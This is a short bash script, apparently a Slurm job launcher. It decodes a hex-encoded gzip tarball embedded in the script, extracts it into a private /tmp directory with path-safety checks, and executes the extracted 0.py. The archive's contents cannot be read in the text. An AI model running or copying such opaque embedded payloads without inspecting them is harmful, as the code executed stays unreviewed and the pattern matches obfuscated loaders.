#!/bin/bash
set -euo pipefail
exec /usr/bin/python3 -I -s -B - <<'A'
import hashlib,io,json,os,sys,tarfile
from pathlib import Path,PurePosixPath
j=os.environ.get('SLURM_JOB_ID','')
if not j.isdigit():raise ValueError('Allocation required')
b=bytes.fromhex('1f8b0800000000000003ed954d6fdb300c867bf6af1072b10d048afc15c72972dc7d876d97a128688b4e9426b621296bb361ff7d921d14190aecd676c3f81c2c4b165f4aa4280bbe377d77f3aa08c75288b1152f5b9165f9f3fb34be2c97e50d13afbbac8993b1a09dcbb7f0f517f26366fb07ec666b36835a24699617cb7255cde66c36c0f9d083bc373b488ba59fd124982e655a4256a77956a66999169814599a37452693659d6151b55803602371d5cab20051655983886955a5d7aaf5d9a271a245b64af24af82f07e8ae9cd5629521804491e42249526c96d0026652e6a22a8b02ca42d43960994b59c96c05adc4b616a51b6f64b26a673fdf3bb6ff02820fe757f7f1e7fa4f92e445fde77946f5ff16a8e3d06bcbccd9ccfd8f60be03b33ba87aee82d2aa0306adee8f6c00eb07d965f247d70df4c6379133e4a0b7dfbe2677f16db3f11adcd7b78922bd08c5f8770963aed195bcc5271bc571009369b81874bfc7c62e9afe783c75ca9e17fbfd194fdd368c17cdd770bc99c23b2f63b7dfc3008c41e7feb2443e5d15114ce2e37de2d4f90e9fa4daa271ae361ba7f2fb3516de058fcaeed8657fbc1fb08b206660985d07aced3543a6bab1c354cbbade32e41d1c91fb83628db78ec25e373bd0f27e97884518af9bbeb3aa3be1b58d32de4114332719721e7ad571df935ccc072fb7d6a00cb22f7038e107ad7b1d859f3b03ad5fc470b261ec24878d0be5102e26c3dbc15b6267f9f1412a1d4d1db3f9a44f38c72765ec7dff30f66237f5512b8b97e058ee12a0a1b1e3c270ca8a4f884fa2cf31579d8f7024e6c6ea6874eabe8e47e06ac37cdf3f1f8523a82ef08f48c7c17b9f6582200882200882200882200882200882200882200882f85ff905ee402a0600280000')
r=Path('/tmp')/('a'+j+'ab0123456789')
r.mkdir(mode=0o700)
with tarfile.open(fileobj=io.BytesIO(b)) as a:
    for e in a:
        n=PurePosixPath(e.name)
        if n.is_absolute() or '..' in n.parts or not e.isfile():raise ValueError('Unsafe input')
        p=r/e.name;p.parent.mkdir(parents=True,exist_ok=True)
        with a.extractfile(e) as i,p.open('xb') as o:o.write(i.read())
os.chdir(r)
os.execv(sys.executable,[sys.executable,'-I','-s','-B',str(r/'0.py'),str(r)])
A
